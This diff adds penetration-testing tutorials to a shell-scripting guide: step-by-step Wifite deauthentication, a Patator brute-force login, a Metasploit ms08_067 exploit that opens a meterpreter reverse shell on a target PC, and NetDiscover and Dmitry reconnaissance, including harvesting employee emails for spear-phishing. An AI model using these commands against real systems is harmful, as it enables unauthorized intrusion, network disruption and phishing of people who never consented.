@@ -3843,3 +3843,489 @@ greet "Yan"
 
 By following this comprehensive tutorial and practicing with real-world examples, you'll be well on your way to mastering shell scripting. Happy scripting!
 
+## Real-Life Examples
+
+### Example 1: Knocking Down a Wi-Fi Network with Wifite
+
+1. **Open Terminal:**
+
+   Open your terminal in Kali Linux.
+
+2. **Put Your Wireless Adapter into Monitor Mode:**
+
+   ```sh
+   sudo airmon-ng start wlan0
+   ```
+
+   Replace `wlan0` with your wireless adapter's name.
+
+3. **Run Wifite:**
+
+   ```sh
+   sudo wifite
+   ```
+
+4. **Select the Target Network:**
+
+   - Wifite will scan and list available networks.
+   - Choose the number corresponding to the target network.
+
+5. **Initiate Deauthentication Attack:**
+
+   Wifite will automatically attempt to capture handshakes by deauthenticating clients from the target network. This will cause temporary disruption.
+
+   ```sh
+   [0:00:13] 80C7DA53E7EC WPA2 (6 @ 12dB) [1 handshake]
+   [+] WPA Handshake: 80C7DA53E7EC (channel 6)
+   ```
+
+6. **Stop the Attack:**
+
+   You can manually stop the attack by pressing `Ctrl+C`.
+
+### Example 2: Performing a Brute-Force Attack with Patator on a Controlled Site
+
+1. **Open Terminal:**
+
+   Open your terminal in Kali Linux.
+
+2. **Install Patator:**
+
+   If not already installed, install Patator:
+
+   ```sh
+   sudo apt update
+   sudo apt install patator
+   ```
+
+3. **Run Patator for Brute-Forcing Login:**
+
+   ```sh
+   patator http_fuzz url=http://testphp.vulnweb.com/login.php method=POST body='uname=FILE0&pass=FILE1' 0=/path/to/usernames.txt 1=/path/to/passwords.txt -x ignore:fgrep='Senha e/ou nome de usuário incorretos'
+   ```
+
+   Replace `/path/to/usernames.txt` and `/path/to/passwords.txt` with your actual wordlists. Patator will attempt to login using the credentials from the wordlists.
+
+### Example 3: Hacking into a PC via IP Address
+
+**Disclaimer:** This example is for educational purposes only. Unauthorized access to a computer system is illegal.
+
+1. **Open Terminal:**
+
+   Open your terminal in Kali Linux.
+
+2. **Scan for Open Ports and Services:**
+
+   ```sh
+   sudo nmap -sS -sV 192.168.1.100
+   ```
+
+   Replace `192.168.1.100` with the target IP address. This will scan for open ports and services.
+
+3. **Identify Vulnerable Service:**
+
+   Based on the Nmap results, identify a service with known vulnerabilities. For example, if port 445 (SMB) is open:
+
+   ```sh
+   sudo searchsploit smb
+   ```
+
+4. **Exploit the Vulnerability:**
+
+   Use Metasploit to exploit the vulnerability:
+
+   ```sh
+   sudo msfconsole
+   msf6> use exploit/windows/smb/ms08_067_netapi
+   msf6 exploit(windows/smb/ms08_067_netapi) > set RHOST 192.168.1.100
+   msf6 exploit(windows/smb/ms08_067_netapi) > set PAYLOAD windows/meterpreter/reverse_tcp
+   msf6 exploit(windows/smb/ms08_067_netapi) > set LHOST <your_IP>
+   msf6 exploit(windows/smb/ms08_067_netapi) > exploit
+   ```
+
+   Replace `<your_IP>` with your actual IP address. This will open a reverse shell on the target PC.
+
+### Example 4: Mapping All Pages of a Website with Nmap
+
+1. **Open Terminal:**
+
+   Open your terminal in Kali Linux.
+
+2. **Scan the Website:**
+
+   ```sh
+   sudo nmap -p 80 --script http-enum http://example.com
+   ```
+
+   Replace `http://example.com` with the target website URL. The `http-enum` script will enumerate directories and pages.
+
+3. **Analyze the Results:**
+
+   Nmap will provide a list of directories and pages found on the target website.
+
+   ```sh
+   PORT   STATE SERVICE
+   80/tcp open  http
+   | http-enum:
+   |   /admin.php
+   |   /login.php
+   |   /images/
+   ```
+
+By following these examples, you can learn how to utilize various tools for penetration testing and ethical hacking. Remember to always have proper authorization before testing any systems.
+
+### NetDiscover Tutorial: A Comprehensive Guide
+
+#### Introduction
+
+NetDiscover is an active/passive network address discovery tool, primarily used to identify hosts on a local network. It is particularly useful for network administrators and security professionals who need to perform network reconnaissance. This tutorial will guide you through the basics of NetDiscover, its installation, usage, and practical examples to help you master this tool.
+
+#### Table of Contents
+
+1. Introduction
+2. Installation
+3. Basic Usage
+4. Advanced Usage
+5. Real-life Examples
+6. Conclusion
+
+---
+
+### 1. Introduction
+
+NetDiscover is a simple yet powerful tool designed to identify live hosts on a network. It sends ARP requests to the network and listens for responses to determine active IP addresses. This tool can operate in both active and passive modes.
+
+- **Active Mode:** Sends ARP requests to discover hosts.
+- **Passive Mode:** Listens to network traffic to identify hosts.
+
+### 2. Installation
+
+NetDiscover can be easily installed on Linux distributions. Here are the steps for installation on Debian-based systems (e.g., Ubuntu, Kali Linux):
+
+```bash
+sudo apt update
+sudo apt install netdiscover
+```
+
+For Red Hat-based systems (e.g., CentOS, Fedora):
+
+```bash
+sudo yum install netdiscover
+```
+
+To verify the installation, run:
+
+```bash
+netdiscover -h
+```
+
+This command should display the help menu for NetDiscover.
+
+### 3. Basic Usage
+
+NetDiscover's basic usage involves discovering hosts on a network. The simplest command is:
+
+```bash
+sudo netdiscover
+```
+
+This command will scan the local network for active hosts using the default settings.
+
+#### Scanning a Specific Range
+
+To scan a specific IP range, use the `-r` option followed by the IP range:
+
+```bash
+sudo netdiscover -r 192.168.1.0/24
+```
+
+This command will scan the IP range 192.168.1.0 to 192.168.1.255.
+
+#### Passive Mode
+
+To run NetDiscover in passive mode, use the `-p` option:
+
+```bash
+sudo netdiscover -p
+```
+
+In passive mode, NetDiscover will listen for ARP requests and responses without actively sending any packets.
+
+### 4. Advanced Usage
+
+NetDiscover offers several advanced options to customize its behavior.
+
+#### Specifying a Network Interface
+
+To specify a network interface, use the `-i` option:
+
+```bash
+sudo netdiscover -i eth0
+```
+
+This command will use the `eth0` interface for scanning.
+
+#### Output Format
+
+NetDiscover supports different output formats. To specify the output format, use the `-P` option:
+
+```bash
+sudo netdiscover -P
+```
+
+This will display results in a plain list format, which is useful for scripting.
+
+#### Time Interval
+
+To set a custom time interval between ARP requests, use the `-s` option:
+
+```bash
+sudo netdiscover -s 2
+```
+
+This sets the interval to 2 seconds between each ARP request.
+
+### 5. Real-life Examples
+
+#### Example 1: Scanning a Local Network
+
+Imagine you are a network administrator who needs to discover all devices connected to your local network. You can use NetDiscover to scan the entire subnet:
+
+```bash
+sudo netdiscover -r 192.168.0.0/24
+```
+
+This command will list all active devices within the 192.168.0.0/24 subnet.
+
+#### Example 2: Identifying Unknown Devices
+
+If you notice unusual traffic on your network, you might want to identify unknown devices. Running NetDiscover in passive mode will help:
+
+```bash
+sudo netdiscover -p
+```
+
+This will listen for ARP traffic and help you identify devices without sending any packets.
+
+#### Example 3: Discovering Devices on a Specific Interface
+
+If your machine has multiple network interfaces, you may want to scan a specific interface. For example, to scan devices on the `wlan0` interface:
+
+```bash
+sudo netdiscover -i wlan0 -r 10.0.0.0/24
+```
+
+This command scans the 10.0.0.0/24 subnet using the `wlan0` interface.
+
+#### Example 4: Automating Network Scans
+
+To automate network scans and log results, you can use NetDiscover with a cron job. Create a script:
+
+```bash
+#!/bin/bash
+netdiscover -P -r 192.168.1.0/24 > /var/log/netdiscover.log
+```
+
+Make the script executable:
+
+```bash
+chmod +x /path/to/script.sh
+```
+
+Add a cron job to run the script daily:
+
+```bash
+crontab -e
+```
+
+Add the following line:
+
+```bash
+0 2 * * * /path/to/script.sh
+```
+
+This will run the script every day at 2 AM, logging the results to `/var/log/netdiscover.log`.
+
+### 6. Conclusion
+
+NetDiscover is a versatile tool for network discovery and reconnaissance. By understanding its basic and advanced usage, you can effectively monitor and manage your network. Whether you are scanning for active hosts, identifying unknown devices, or automating network scans, NetDiscover provides a reliable solution.
+
+### Additional Resources
+
+- [NetDiscover GitHub Repository](https://github.com/alexxy/netdiscover)
+- [Kali Linux Documentation on NetDiscover](https://www.kali.org/tools/netdiscover/)
+
+By following this tutorial, you should now be equipped with the knowledge to effectively use NetDiscover for various network discovery tasks. Happy scanning!
+
+## Comprehensive Dmitry Hacking Tool Tutorial
+
+### Introduction to Dmitry
+
+Dmitry, short for Deepmagic Information Gathering Tool, is an open-source command-line tool designed for gathering information about a host or domain. It's widely used for footprinting, which is a crucial step in penetration testing and ethical hacking. Dmitry helps in collecting subdomains, email addresses, open ports, and other valuable information about a target.
+
+### Installation
+
+Before diving into the functionalities of Dmitry, let's start with its installation. Dmitry is available on most Linux distributions and can be installed easily using package managers.
+
+For Debian-based systems (like Ubuntu):
+
+```bash
+sudo apt-get update
+sudo apt-get install dmitry
+```
+
+For Red Hat-based systems (like CentOS):
+
+```bash
+sudo yum install dmitry
+```
+
+For Arch-based systems:
+
+```bash
+sudo pacman -S dmitry
+```
+
+### Basic Usage
+
+The basic syntax for using Dmitry is as follows:
+
+```bash
+dmitry [options] [target]
+```
+
+For example, to gather information about `example.com`:
+
+```bash
+dmitry example.com
+```
+
+### Options and Their Uses
+
+Dmitry provides several options to customize the information gathering process. Here are the primary options:
+
+- `-i` : Perform a WHOIS lookup on the IP address.
+- `-w` : Perform a WHOIS lookup on the domain name.
+- `-n` : Retrieve Netcraft.com information.
+- `-s` : Perform a search for possible subdomains.
+- `-e` : Perform a search for possible email addresses.
+- `-p` : Perform a TCP port scan.
+- `-b` : Execute all of the above operations.
+
+Let's explore each of these options in detail.
+
+### WHOIS Lookup on IP Address (`-i`)
+
+A WHOIS lookup provides registration details about a domain or IP address. To perform a WHOIS lookup on the IP address of `example.com`:
+
+```bash
+dmitry -i example.com
+```
+
+This command will output information such as the IP address range, the registrar, and contact details.
+
+### WHOIS Lookup on Domain Name (`-w`)
+
+Similar to the IP lookup, the domain WHOIS lookup provides registration details about the domain:
+
+```bash
+dmitry -w example.com
+```
+
+This will fetch details like domain registration date, expiry date, registrant information, etc.
+
+### Retrieve Netcraft Information (`-n`)
+
+Netcraft is a web service providing information about websites, including technologies used, uptime, and more. To gather Netcraft information:
+
+```bash
+dmitry -n example.com
+```
+
+This can provide insights into the site's history and technology stack.
+
+### Subdomain Search (`-s`)
+
+Discovering subdomains can reveal additional attack vectors. To search for subdomains:
+
+```bash
+dmitry -s example.com
+```
+
+This will list possible subdomains, which can be crucial for a comprehensive security assessment.
+
+### Email Address Search (`-e`)
+
+Finding email addresses associated with a domain can be useful for social engineering attacks. To search for email addresses:
+
+```bash
+dmitry -e example.com
+```
+
+This command will return any email addresses found, which might be used for phishing or other social engineering techniques.
+
+### TCP Port Scan (`-p`)
+
+Scanning for open TCP ports can reveal services running on the target host. To perform a port scan:
+
+```bash
+dmitry -p example.com
+```
+
+This will list the open ports, which can help in identifying potential vulnerabilities.
+
+### Perform All Operations (`-b`)
+
+To perform all the above operations in a single command, use:
+
+```bash
+dmitry -b example.com
+```
+
+This is a comprehensive command that gathers all available information about the target.
+
+### Real-Life Examples
+
+#### Example 1: Gathering Information on a Target Domain
+
+Suppose you want to gather information on `targetsite.com`. Using Dmitry, you can perform a full scan:
+
+```bash
+dmitry -b targetsite.com
+```
+
+Output might include:
+
+- WHOIS information about the domain and IP.
+- Netcraft data revealing the server details and technologies used.
+- Subdomains like `mail.targetsite.com`, `blog.targetsite.com`.
+- Email addresses such as `admin@targetsite.com`.
+- Open TCP ports like 22 (SSH), 80 (HTTP), 443 (HTTPS).
+
+#### Example 2: Identifying Potential Attack Vectors
+
+Imagine you're conducting a penetration test for a client. Start with:
+
+```bash
+dmitry -s -e -p clientdomain.com
+```
+
+This command focuses on subdomains, email addresses, and open ports. You might discover:
+
+- Subdomains like `test.clientdomain.com`, which could be less secure.
+- Email addresses of employees for spear-phishing attacks.
+- Open ports revealing services like SSH, FTP, and web servers.
+
+### Combining Dmitry with Other Tools
+
+Dmitry can be combined with other tools for more in-depth analysis. For example, after identifying open ports with Dmitry, you can use Nmap for detailed scanning:
+
+```bash
+nmap -A -p 22,80,443 clientdomain.com
+```
+
+This will provide comprehensive details about the services running on those ports.
+
+### Conclusion
+
+Dmitry is a powerful tool for initial reconnaissance in ethical hacking and penetration testing. By using its various options, you can gather valuable information about your target, helping to identify potential vulnerabilities and attack vectors. Remember to use Dmitry responsibly and only on systems you have permission to test.
